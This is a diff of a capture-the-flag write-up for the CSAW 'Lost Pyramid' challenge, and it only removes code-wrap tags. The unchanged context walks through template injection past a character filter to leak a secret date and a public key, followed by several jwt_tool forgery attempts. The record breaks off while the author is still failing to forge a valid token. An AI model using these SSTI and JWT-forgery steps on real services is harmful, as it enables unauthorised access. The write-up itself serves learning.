@@ -24,7 +24,6 @@ layout:
 
 ## Source Code
 
-{% code overflow="wrap" %}
 
 ```python
 from flask import Flask, request, render_template, jsonify, make_response, redirect, url_for, render_template_string
@@ -170,7 +169,6 @@ if __name__ == '__main__':
     app.run(host = '0.0.0.0', port = 8050)
 ```
 
-{% endcode %}
 
 ## Solution
 
@@ -180,7 +178,6 @@ Note that `KINGSDAY` is set as environment variable so even if we could easily t
 
 Let's check the JWT format.
 
-{% code overflow="wrap" %}
 
 ```bash
 jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU5UX0RBVEUiOiIwN18wOV8yMDI0X0FEIiwiZXhwIjo5NjMzMzcxNDI5OX0.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ
@@ -206,11 +203,9 @@ nbf = NotBefore
 ----------------------
 ```
 
-{% endcode %}
 
 What happens if we modify the JWT?
 
-{% code overflow="wrap" %}
 
 ```bash
 jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU5UX0RBVEUiOiIwN18wOV8yMDI0X0FEIiwiZXhwIjo5NjMzMzcxNDI5OX0.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ -I -pc ROLE -pv royalty
@@ -218,13 +213,11 @@ jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU
 eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoicm95YWx0eSIsIkNVUlJFTlRfREFURSI6IjA3XzA5XzIwMjRfQUQiLCJleHAiOjk2MzMzNzE0Mjk5fQ.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ
 ```
 
-{% endcode %}
 
 We get an `invalid access` error due to the mismatched signature. I also tried the "none" algorithm attack but had the same issue.
 
 Checking a different endpoint; https://lost-pyramid.ctf.csaw.io/scarab_room, it seems to be vulnerable to SSTI, but we have a filter.
 
-{% code overflow="wrap" %}
 
 ```python
 kings_safelist = ['{','}', '𓁹', '𓆣','𓀀', '𓀁', '𓀂', '𓀃', '𓀄', '𓀅', '𓀆', '𓀇', '𓀈', '𓀉', '𓀊', '𓀐', '𓀑', '𓀒', '𓀓', '𓀔', '𓀕', '𓀖', '𓀗', '𓀘', '𓀙', '𓀚', '𓀛', '𓀜', '𓀝', '𓀞', '𓀟',
@@ -234,23 +227,19 @@ kings_safelist = ['{','}', '𓁹', '𓆣','𓀀', '𓀁', '𓀂', '𓀃', '𓀄'
 name = ''.join([char for char in name if char.isalnum() or char in kings_safelist])
 ```
 
-{% endcode %}
 
 We can use curly braces and alphanumeric characters, e.g. `{{config}}`.
 
-{% code overflow="wrap" %}
 
 ```json
 {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}
 ```
 
-{% endcode %}
 
 Tried to check `{{settings}}` as well, but no output.
 
 Converting the filter list to decimals, we'll see the size difference of the characters.
 
-{% code overflow="wrap" %}
 
 ```json
 {
@@ -316,33 +305,27 @@ Converting the filter list to decimals, we'll see the size difference of the cha
 }
 ```
 
-{% endcode %}
 
 A useful character here might `.`, which is ASCII code `46`. Searching the above list, only one is worth investigating:
 
-{% code overflow="wrap" %}
 
 ```
 '𓀖':77846
 ```
 
-{% endcode %}
 
 Breaking the unicode into ASCII, we'll find `778` is a newline (`%0a`) and `46` is a `.`
 
 Wait, I'm a n00b.. I just realised we can send `{{KINGSDAY}}` to print the variable.
 
-{% code overflow="wrap" %}
 
 ```
 03_07_1341_BC
 ```
 
-{% endcode %}
 
 Let's forge a JWT with the correct `ROLE` and `CURRENT_DATE`.
 
-{% code overflow="wrap" %}
 
 ```bash
 jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU5UX0RBVEUiOiIwN18wOV8yMDI0X0FEIiwiZXhwIjo5NjMzMzcxNDI5OX0.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ -I -pc ROLE -pv royalty -pc CURRENT_DATE -pv 03_07_1341_BC
@@ -350,21 +333,17 @@ jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU
 eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoicm95YWx0eSIsIkNVUlJFTlRfREFURSI6IjAzXzA3XzEzNDFfQkMiLCJleHAiOjk2MzMzNzE0Mjk5fQ.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ
 ```
 
-{% endcode %}
 
 Still can't use it. Tried to use SSTI to get `{{PRIVATE_KEY}}` but doesn't print. We can print the `{{PUBLICKEY}}` though.
 
-{% code overflow="wrap" %}
 
 ```
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPIeM72Nlr8Hh6D1GarhZ/DCPRCR1sOXLWVTrUZP9aw2
 ```
 
-{% endcode %}
 
 Save it to a file and use algorithm confusion.
 
-{% code overflow="wrap" %}
 
 ```bash
 jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU5UX0RBVEUiOiIwN18wOV8yMDI0X0FEIiwiZXhwIjo5NjMzMzcxNDI5OX0.53yJHr1ZxEYzRIrX2GEDao3kTbAY-W3y-9vOHZvRCmYtD49ty-EIo7KyjpwPEEmz-FxxUq2rynETCKiW_6ZIBQ -I -pc ROLE -pv royalty -pc CURRENT_DATE -pv 03_07_1341_BC -X k -pk pubkey
@@ -372,7 +351,6 @@ jwt_tool eyJ0eXAiOiJKV1QiLCJhbGciOiJFZERTQSJ9.eyJST0xFIjoiY29tbW9uZXIiLCJDVVJSRU
 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJST0xFIjoicm95YWx0eSIsIkNVUlJFTlRfREFURSI6IjAzXzA3XzEzNDFfQkMiLCJleHAiOjk2MzMzNzE0Mjk5fQ.c5OwTPXb7qLz-R0mAhBj03jauzQEcnRBcor9KVyW8Q8
 ```
 
-{% endcode %}
 
 It doesn't work! I tried various formats for the public key, but all failed. I assumed I must need the `PRIVATE_KEY` but couldn't use `_` due to the filter list. I was confident there was some unicode issue; otherwise, why include all those symbols in the filter list?
 
